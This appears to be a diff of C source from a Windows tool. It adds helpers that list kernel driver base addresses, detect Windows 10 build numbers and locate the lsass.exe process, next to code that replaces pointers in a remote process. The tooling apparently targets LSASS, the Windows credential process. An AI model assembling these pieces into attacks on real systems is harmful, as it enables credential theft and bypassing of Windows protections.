@@ -53,6 +53,154 @@ BOOL EnablePrivilege(LPWSTR SePrivilege)
 	return status;
 }
 
+LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
+{
+	LPVOID tmp_array = 0;
+	LPVOID result = 0;
+	DWORD needed = 0, needed2 = 0;
+	DWORD64 i = 0;
+	char name[MAX_PATH];
+	int j = 0;
+
+	EnumDeviceDrivers(tmp_array, 0, &needed);
+	if (needed > 0)
+	{
+		tmp_array = (LPVOID)LocalAlloc(LPTR, (SIZE_T)needed);
+		if (tmp_array)
+		{
+			if (EnumDeviceDrivers(tmp_array, needed, &needed2))
+			{
+				for (i = 0; i < needed / sizeof(LPVOID); i++)
+				{
+					GetDeviceDriverBaseNameA(*(PVOID*)(PVOID*)((PBYTE)tmp_array + (8 * i)), name, MAX_PATH);
+					if (_stricmp(name, DeviceDriverName) == 0)
+					{
+						RtlCopyMemory(&result, (PBYTE)tmp_array + (8 * i), sizeof(LPVOID));
+						break;
+					}
+				}
+			}
+			//SecureZeroMemory(&tmp_array, (SIZE_T)needed);
+			LocalFree(tmp_array);
+		}
+	}
+
+	return result;
+
+}
+
+WINDOWS_VERSION GetOsBuildNumber()
+{
+	NTSTATUS status = 0;
+	WINDOWS_VERSION iVersion = WINDOWS_UNSUPPORTED;
+	RTL_OSVERSIONINFOW RtlOSVersion = { 0 };
+	PRTLGETVERSION RtlGetVersion = 0;
+	HMODULE hModule = 0;
+
+	hModule = GetModuleHandle(L"ntdll.dll");
+	if (hModule)
+	{
+		RtlGetVersion = (PRTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
+		if (RtlGetVersion)
+		{
+			RtlOSVersion.dwOSVersionInfoSize = sizeof(RtlOSVersion);
+			status = RtlGetVersion(&RtlOSVersion);
+
+			if ((status == STATUS_SUCCESS) && (RtlOSVersion.dwMajorVersion == 10))
+			{
+				switch (RtlOSVersion.dwBuildNumber)
+				{
+				case 14393:
+					iVersion = WINDOWS_REDSTONE_1;
+					break;
+
+				case 15063:
+					iVersion = WINDOWS_REDSTONE_2;
+					break;
+
+				case 16299:
+					iVersion = WINDOWS_REDSTONE_3;
+					break;
+
+				case 17134:
+					iVersion = WINDOWS_REDSTONE_4;
+					break;
+
+				case 17763:
+					iVersion = WINDOWS_REDSTONE_5;
+					break;
+
+				case 18362:
+					iVersion = WINDOWS_19H1;
+					break;
+
+				case 18363:
+					iVersion = WINDOWS_19H2;
+					break;
+
+				case 19041:
+					iVersion = WINDOWS_20H1;
+					break;
+
+				case 19042:
+					iVersion = WINDOWS_20H2;
+					break;
+
+				case 19043:
+					iVersion = WINDOWS_21H1;
+					break;
+
+				case 19044:
+					iVersion = WINDOWS_21H2;
+					break;
+
+				case 19045:
+					iVersion = WINDOWS_22H2;
+					break;
+
+				default:
+					iVersion = WINDOWS_UNSUPPORTED;
+					break;
+				}
+			}
+
+			SecureZeroMemory(&RtlOSVersion, sizeof(RTL_OSVERSIONINFOW));
+		}
+	}
+
+	return iVersion;
+
+}
+
+DWORD GetLsaProcessId()
+{
+	DWORD result = 0;
+	HANDLE hSnap = 0;
+	PROCESSENTRY32W entry32 = { 0 };
+
+	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnap)
+	{
+		entry32.dwSize = sizeof(PROCESSENTRY32W);
+		if (Process32First(hSnap, &entry32))
+		{
+			while (Process32Next(hSnap, &entry32))
+			{
+				if (_wcsicmp(entry32.szExeFile, L"lsass.exe") == 0)
+				{
+					result = entry32.th32ProcessID;
+					break;
+				}
+			}
+			SecureZeroMemory(&entry32, sizeof(PROCESSENTRY32W));
+		}
+		CloseHandle(hSnap);
+	}
+
+	return result;
+
+}
+
 LPVOID ReplaceFakePointers(HANDLE hProcess, LPVOID buffer, DWORD DataSize, PREPLACEABLE_POINTER pReplPointers, DWORD count)
 {
 	LPVOID RemoteHandler = 0;
